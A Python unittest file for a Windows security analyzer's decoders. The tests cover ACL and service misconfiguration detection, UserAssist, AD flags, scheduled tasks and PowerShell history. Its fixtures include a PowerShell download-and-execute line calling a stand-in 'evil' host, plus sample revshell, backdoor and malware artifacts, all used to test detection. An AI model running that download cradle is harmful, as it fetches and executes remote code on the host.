from __future__ import annotations

import base64
import sqlite3
import struct
import tempfile
import unittest
from datetime import datetime, timezone
from pathlib import Path

from analyzer_web.decoders.ad import decode_sid_bytes, normalize_attributes
from analyzer_web.decoders.browser import parse_chromium_history
from analyzer_web.decoders.recent import csv_source_name, parse_recent_csv, resolve_application
from analyzer_web.decoders.sddl import decode_file_acl_record, decode_service_acl_record, extract_token_context
from analyzer_web.decoders.services import decode_record as decode_service_record
from analyzer_web.decoders.userassist import decode_record


class DecoderTests(unittest.TestCase):
    def test_token_context_extraction(self):
        token = {
            "name": "CORP\\jdoe",
            "sid": "S-1-5-21-1111-2222-3333-1005",
            "groups": [
                {"name": "CORP\\Domain Users", "sid": "S-1-5-21-1111-2222-3333-513"},
                {"name": "BUILTIN\\Users", "sid": "S-1-5-32-545"},
                {"name": "BUILTIN\\Administrators", "sid": "S-1-5-32-544", "attributes_raw": "Mandatory group, Enabled group"},
            ],
        }
        ctx = extract_token_context(token)
        self.assertEqual(ctx["user_name"], "CORP\\jdoe")
        self.assertIn("corp\\jdoe", ctx["user_names"])
        self.assertIn("jdoe", ctx["user_names"])
        self.assertIn("S-1-5-21-1111-2222-3333-1005", ctx["user_sids"])
        self.assertTrue(ctx["is_admin"])
        # Non-admin groups
        self.assertIn("s-1-5-21-1111-2222-3333-513", [s.lower() for s in ctx["non_admin_group_sids"]])
        self.assertNotIn("S-1-5-32-544", ctx["non_admin_group_sids"])

    def test_service_acl_decoder(self):
        # 1. Standard service DACL
        std_raw = {
            "service": "NormalSvc",
            "exit_code": 0,
            "raw": ["", "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)"],
        }
        res_std = decode_service_acl_record(std_raw)
        self.assertEqual(res_std["service"], "NormalSvc")
        self.assertFalse(res_std["vulnerable"])
        self.assertFalse(res_std["modifiable_by_users"])
        self.assertEqual(res_std["ace_count"], 3)

        # 2. Vulnerable service DACL (Authenticated Users can change config)
        vuln_raw = {
            "service": "VulnSvc",
            "exit_code": 0,
            "raw": ["", "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;AU)"],
        }
        res_vuln = decode_service_acl_record(vuln_raw)
        self.assertTrue(res_vuln["vulnerable"])
        self.assertTrue(res_vuln["modifiable_by_users"])
        self.assertTrue(res_vuln["startable_by_users"])
        self.assertTrue(any("Authenticated Users" in p for p in res_vuln["vulnerable_principals"]))

        # 3. Context-aware service ACL abuse (Target user SID specifically in DACL)
        token_ctx = {
            "user_name": "CORP\\attacker",
            "user_sid": "S-1-5-21-999-888-777-1001",
            "user_names": {"corp\\attacker", "attacker"},
            "user_sids": {"S-1-5-21-999-888-777-1001"},
            "non_admin_group_names": set(),
            "non_admin_group_sids": set(),
            "is_admin": False,
        }
        user_vuln_raw = {
            "service": "TargetSvc",
            "exit_code": 0,
            "raw": ["", "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-999-888-777-1001)"],
        }
        res_user_vuln = decode_service_acl_record(user_vuln_raw, token_context=token_ctx)
        self.assertTrue(res_user_vuln["vulnerable"])
        self.assertTrue(res_user_vuln["user_can_modify"])
        self.assertTrue(res_user_vuln["user_can_start"])
        self.assertTrue(any("Текущий токен" in p for p in res_user_vuln["vulnerable_principals"]))

    def test_file_acl_decoder(self):
        # 1. Standard read-only file ACL
        std_file = {
            "path": "C:\\Windows\\System32\\cmd.exe",
            "owner": "NT SERVICE\\TrustedInstaller",
            "access": [
                {"identity": "BUILTIN\\Administrators", "rights": "FullControl", "type": "Allow"},
                {"identity": "BUILTIN\\Users", "rights": "ReadAndExecute", "type": "Allow"},
            ],
        }
        res_std = decode_file_acl_record(std_file)
        self.assertFalse(res_std["vulnerable"])
        self.assertFalse(res_std["high_risk"])
        self.assertEqual(res_std["file_type"], "executable")

        # 2. Vulnerable service executable writable by Users
        vuln_file = {
            "path": "C:\\Program Files\\MyService\\service.exe",
            "owner": "BUILTIN\\Administrators",
            "access": [
                {"identity": "BUILTIN\\Users", "rights": "FullControl", "type": "Allow"},
            ],
        }
        res_vuln = decode_file_acl_record(vuln_file)
        self.assertTrue(res_vuln["vulnerable"])
        self.assertTrue(res_vuln["high_risk"])
        self.assertTrue(res_vuln["writable_by_users"])

        # 3. Context-aware writable configuration file
        token_ctx = {
            "user_name": "CORP\\webuser",
            "user_sid": "S-1-5-21-555-666-777-1002",
            "user_names": {"corp\\webuser", "webuser"},
            "user_sids": {"S-1-5-21-555-666-777-1002"},
            "non_admin_group_names": set(),
            "non_admin_group_sids": set(),
            "is_admin": False,
        }
        config_file = {
            "path": "C:\\inetpub\\wwwroot\\web.config",
            "owner": "NT AUTHORITY\\SYSTEM",
            "access": [
                {"identity": "CORP\\webuser", "rights": "Modify", "type": "Allow"},
            ],
        }
        res_cfg = decode_file_acl_record(config_file, token_context=token_ctx)
        self.assertTrue(res_cfg["vulnerable"])
        self.assertTrue(res_cfg["config_risk"])
        self.assertTrue(res_cfg["user_writable"])
        self.assertEqual(res_cfg["file_type"], "config")
        self.assertTrue(any("Текущий пользователь" in p for p in res_cfg["vulnerable_principals"]))
    def test_services_decoder(self):
        # 1. Test svchost service with ServiceDll
        svchost_raw = {
            "name": "TestSvc",
            "values": [
                {"name": "ImagePath", "value": "%SystemRoot%\\system32\\svchost.exe -k netsvcs -p"},
                {"name": "Start", "value": 2},
                {"name": "Type", "value": 32},
                {"name": "ObjectName", "value": "NT AUTHORITY\\LocalService"},
            ],
            "parameters": [
                {"name": "ServiceDll", "value": "%SystemRoot%\\system32\\testsvc.dll"}
            ]
        }
        res = decode_service_record(svchost_raw)
        self.assertEqual(res["name"], "TestSvc")
        self.assertTrue(res["is_svchost"])
        self.assertEqual(res["svchost_group"], "netsvcs")
        self.assertEqual(res["service_dll"], "%SystemRoot%\\system32\\testsvc.dll")
        self.assertEqual(res["account_type"], "system")
        self.assertEqual(res["start_type"], "auto")
        self.assertFalse(res["unquoted_path"])

        # 2. Test unquoted path vulnerability detection
        vuln_raw = {
            "name": "VulnApp",
            "values": [
                {"name": "ImagePath", "value": "C:\\Program Files\\My Vulnerable App\\service.exe -run"},
                {"name": "Start", "value": 2},
                {"name": "Type", "value": 16},
                {"name": "ObjectName", "value": "CORP\\svc_account"},
            ],
            "parameters": []
        }
        res_vuln = decode_service_record(vuln_raw)
        self.assertTrue(res_vuln["unquoted_path"])
        self.assertEqual(res_vuln["executable"], "C:\\Program Files\\My Vulnerable App\\service.exe")
        self.assertEqual(res_vuln["arguments"], "-run")
        self.assertEqual(res_vuln["account_type"], "named")
        self.assertTrue(res_vuln["auto_elevate"])

    def test_userassist_win7_plus(self):
        raw = bytearray(72)
        struct.pack_into("<I", raw, 4, 17)
        struct.pack_into("<I", raw, 8, 4)
        struct.pack_into("<I", raw, 12, 12500)
        filetime = int((datetime(2026, 1, 2, tzinfo=timezone.utc).timestamp() + 11644473600) * 10_000_000)
        struct.pack_into("<Q", raw, 60, filetime)
        result = decode_record({"name": "P:\\Jvaqbjf\\flfgrz32\\pzq.rkr", "encoding": "base64", "value": base64.b64encode(raw).decode()})
        self.assertEqual(result["decoded_name"], "C:\\Windows\\system32\\cmd.exe")
        self.assertEqual(result["run_count"], 17)
        self.assertEqual(result["focus_count"], 4)
        self.assertEqual(result["decode_status"], "success")
        self.assertTrue(result["last_execution_utc"].startswith("2026-01-02"))

    def test_sid_and_ad_flags(self):
        sid = bytes([1, 2]) + (5).to_bytes(6, "big") + struct.pack("<II", 21, 1000)
        self.assertEqual(decode_sid_bytes(sid), "S-1-5-21-1000")
        attrs = normalize_attributes({"objectSid": [{"encoding": "base64", "value": base64.b64encode(sid).decode()}], "userAccountControl": [0x400200], "groupType": [-2147483646]})
        self.assertEqual(attrs["objectsid_decoded"], "S-1-5-21-1000")
        self.assertIn("DONT_REQ_PREAUTH", attrs["useraccountcontrol_flags"])
        self.assertEqual(attrs["group_scope"], "global")
        self.assertTrue(attrs["group_security_enabled"])

    def test_chromium_history(self):
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "History"
            db = sqlite3.connect(path)
            db.execute("CREATE TABLE urls(url TEXT,title TEXT,visit_count INTEGER,typed_count INTEGER,last_visit_time INTEGER)")
            db.execute("CREATE TABLE downloads(target_path TEXT,tab_url TEXT,total_bytes INTEGER,state INTEGER,start_time INTEGER,end_time INTEGER)")
            db.execute("INSERT INTO urls VALUES('https://example.test','Example',2,1,1)")
            db.commit(); db.close()
            rows = parse_chromium_history({"History": path}, "chrome", "C:\\Users\\test")
            self.assertEqual(rows[0]["url"], "https://example.test")
            self.assertEqual(rows[0]["browser"], "chrome")

    def test_recent_csv_decoder(self):
        self.assertEqual(csv_source_name("20261014133814_AutomaticDestinations.csv"), "automatic_destinations")
        self.assertEqual(csv_source_name("20261014133814_CustomDestinations.csv"), "custom_destinations")
        self.assertEqual(resolve_application("ccba5a5986c77e43"), "Microsoft Edge")
        self.assertEqual(resolve_application("", r"C:\Windows\System32\cmd.exe"), "Командная строка")

        with tempfile.TemporaryDirectory() as temp:
            csv_path = Path(temp) / "20261014133814_AutomaticDestinations.csv"
            csv_path.write_text(
                "SourceFile,AppId,Path,LocalPath,InteractionCount,MRU,TargetModified,Arguments\n"
                r"C:\test.dest,1021fe3978074634b494e7143444ffaf_7cef0736d236e45a,C:\Users\test\revshell.ps1,C:\Users\test\revshell.ps1,5,0,2026-10-12 06:20:20," + "\n",
                encoding="utf-8"
            )
            records = parse_recent_csv(csv_path)
            self.assertEqual(len(records), 1)
            rec = records[0]
            self.assertEqual(rec["name"], "revshell.ps1")
            self.assertEqual(rec["kind"], "automatic")
            self.assertEqual(rec["interaction_count"], 5)
            self.assertEqual(rec["mru"], 0)
            self.assertTrue(rec["profile_signal"])
            self.assertEqual(rec["application"], "Неизвестное приложение")

    def test_identity_decoders(self):
        from analyzer_web.decoders.identity import decode_token, decode_os, decode_profile
        token = {
            "name": "IIS APPPOOL\\DefaultAppPool",
            "sid": "S-1-5-82-12345",
            "process_id": 1000,
            "authentication_type": "Negotiate",
            "integrity_labels": [{"name": "High Mandatory Level"}],
            "environment": {"user_domain": "CORP"},
            "privileges": [
                {"name": "SeImpersonatePrivilege", "state_raw": "Enabled", "description_raw": "Impersonate a client"},
                {"name": "SeChangeNotifyPrivilege", "state_raw": "Enabled", "description_raw": "Bypass traverse checking"}
            ],
            "groups": [
                {"name": "BUILTIN\\Administrators", "sid": "S-1-5-32-544", "attributes_raw": "Enabled group"}
            ]
        }
        res = decode_token(token)
        self.assertEqual(len(res), 4) # 1 summary + 2 privs + 1 group
        summary = res[0]
        self.assertEqual(summary["kind"], "summary")
        self.assertEqual(summary["integrity"], "High")
        self.assertEqual(summary["domain"], "CORP")
        priv1 = res[1]
        self.assertEqual(priv1["kind"], "privilege")
        self.assertEqual(priv1["name"], "SeImpersonatePrivilege")
        self.assertTrue(priv1["is_dangerous"])
        self.assertEqual(priv1["risk"], "critical")
        grp = res[3]
        self.assertEqual(grp["kind"], "group")
        self.assertTrue(grp["is_admin"])

        os_rec = {"class": "Win32_OperatingSystem", "data": {"Caption": "Windows Server 2022", "Version": "10.0.20348"}}
        res_os = decode_os(os_rec)
        self.assertEqual(res_os["kind"], "os_info")
        self.assertEqual(res_os["name"], "Windows Server 2022")

        prof_rec = {"sid": "S-1-5-21-11-22-33-1001", "path": "C:\\Users\\admin", "current": True}
        res_prof = decode_profile(prof_rec)
        self.assertEqual(res_prof["kind"], "profile")
        self.assertEqual(res_prof["name"], "admin")
        self.assertTrue(res_prof["current"])

    def test_scheduled_tasks_decoder(self):
        from analyzer_web.decoders.tasks import decode_task
        # Profile-relevant task running as SYSTEM from Users folder
        bad_task = {
            "task_name": "Backdoor",
            "task_path": "\\Custom\\",
            "state": "Ready",
            "principal": {"user_id": "SYSTEM", "run_level": "HighestAvailable"},
            "actions": [{"execute": "C:\\Users\\Public\\backdoor.bat", "arguments": ""}],
            "triggers": [{"type": "Daily"}]
        }
        res = decode_task(bad_task)
        self.assertEqual(res["name"], "Backdoor")
        self.assertTrue(res["profile_signal"])
        self.assertIn("путь в профиле/ProgramData", res["context_summary"])

        # Standard Windows task
        clean_task = {
            "task_name": "Defrag",
            "task_path": "\\Microsoft\\Windows\\Defrag\\",
            "state": "Ready",
            "principal": {"user_id": "SYSTEM", "run_level": "Limited"},
            "actions": [{"execute": "%windir%\\system32\\defrag.exe", "arguments": "-c"}],
            "triggers": []
        }
        res_clean = decode_task(clean_task)
        self.assertFalse(res_clean["profile_signal"])

    def test_service_events_decoder(self):
        from analyzer_web.decoders.service_events import decode_service_event
        xml_event = (
            "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
            "<System><EventID>7045</EventID><TimeCreated SystemTime='2026-10-12T10:00:00Z'/><Computer>HOST1</Computer></System>"
            "<EventData>"
            "<Data Name='ServiceName'>MaliciousService</Data>"
            "<Data Name='ImagePath'>C:\\Temp\\malware.exe</Data>"
            "<Data Name='ServiceType'>user mode service</Data>"
            "<Data Name='StartType'>auto start</Data>"
            "<Data Name='AccountName'>LocalSystem</Data>"
            "</EventData>"
            "</Event>"
        )
        res = decode_service_event(xml_event)
        self.assertEqual(res["service_name"], "MaliciousService")
        self.assertEqual(res["image_path"], "C:\\Temp\\malware.exe")
        self.assertTrue(res["profile_signal"])
        self.assertEqual(res["time_created"], "2026-10-12T10:00:00Z")

    def test_network_decoders(self):
        from analyzer_web.decoders.network import decode_firewall, decode_management, decode_proxy, decode_tcp
        # Firewall profile
        prof = {"kind": "profile", "data": {"Name": "Domain", "Enabled": {"name": "False"}}}
        res_prof = decode_firewall(prof)
        self.assertEqual(res_prof["enabled"], "ОТКЛЮЧЕН")
        self.assertTrue(res_prof["is_open"])

        # SMB Server insecure
        smb = {"kind": "smb_server", "data": {"EnableSMB1Protocol": True, "RequireSecuritySignature": False}}
        res_smb = decode_management(smb)
        self.assertTrue(res_smb["has_misconfiguration"])
        self.assertIn("SMBv1", res_smb["risk_summary"])

        # SMB Share writable
        share = {
            "kind": "smb_share",
            "data": {"Name": "Public", "Path": "C:\\Shares\\Public"},
            "share_access": [{"AccountName": "Everyone", "AccessControlType": {"name": "Allow"}, "AccessRight": {"name": "Full"}}]
        }
        res_share = decode_management(share)
        self.assertTrue(res_share["has_misconfiguration"])

        # Proxy
        proxy = {"command": "netsh", "raw": ["Proxy Server(s) : 10.0.0.1:8080", "Bypass List : (none)"]}
        res_proxy = decode_proxy(proxy)
        self.assertEqual(res_proxy["proxy_server"], "10.0.0.1:8080")
        self.assertTrue(res_proxy["is_configured"])

        # TCP Socket
        tcp = {"local_address": "0.0.0.0", "local_port": 445, "state": "Listen", "pid": 4}
        res_tcp = decode_tcp(tcp)
        self.assertIn("SMB", res_tcp["local_port"])
        self.assertTrue(res_tcp["is_listen"])

    def test_configs_and_logs_decoders(self):
        from analyzer_web.decoders.configs import decode_iis, decode_role
        from analyzer_web.decoders.logs_misc import decode_services_state, parse_ps_history_file

        iis_worker = {"kind": "worker", "pid": 5000, "path": "w3wp.exe", "command_line": "w3wp.exe -ap DefaultAppPool"}
        res_worker = decode_iis(iis_worker)
        self.assertEqual(res_worker["kind"], "iis_worker")
        self.assertEqual(res_worker["pid"], 5000)

        role = {"role": "sql_server", "present": True, "values": [{"name": "InstalledInstances", "value": ["SQLEXPRESS"]}]}
        res_role = decode_role(role)
        self.assertEqual(res_role["role"], "Microsoft SQL Server")
        self.assertIn("SQLEXPRESS", res_role["version"])

        svc_state = {"Name": "CustomSvc", "State": "Running", "StartMode": "Auto", "StartName": "CORP\\svc_user"}
        res_svc = decode_services_state(svc_state)
        self.assertTrue(res_svc["named_account"])
        self.assertTrue(res_svc["is_running"])

        with tempfile.TemporaryDirectory() as temp:
            ps_file = Path(temp) / "history.txt"
            ps_file.write_text("whoami\nIEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')\n", encoding="utf-8")
            cmds = parse_ps_history_file(ps_file, "C:\\Users\\test")
            self.assertEqual(len(cmds), 2)
            self.assertTrue(cmds[0]["profile_signal"]) # whoami
            self.assertTrue(cmds[1]["profile_signal"]) # IEX / DownloadString


if __name__ == "__main__":
    unittest.main()
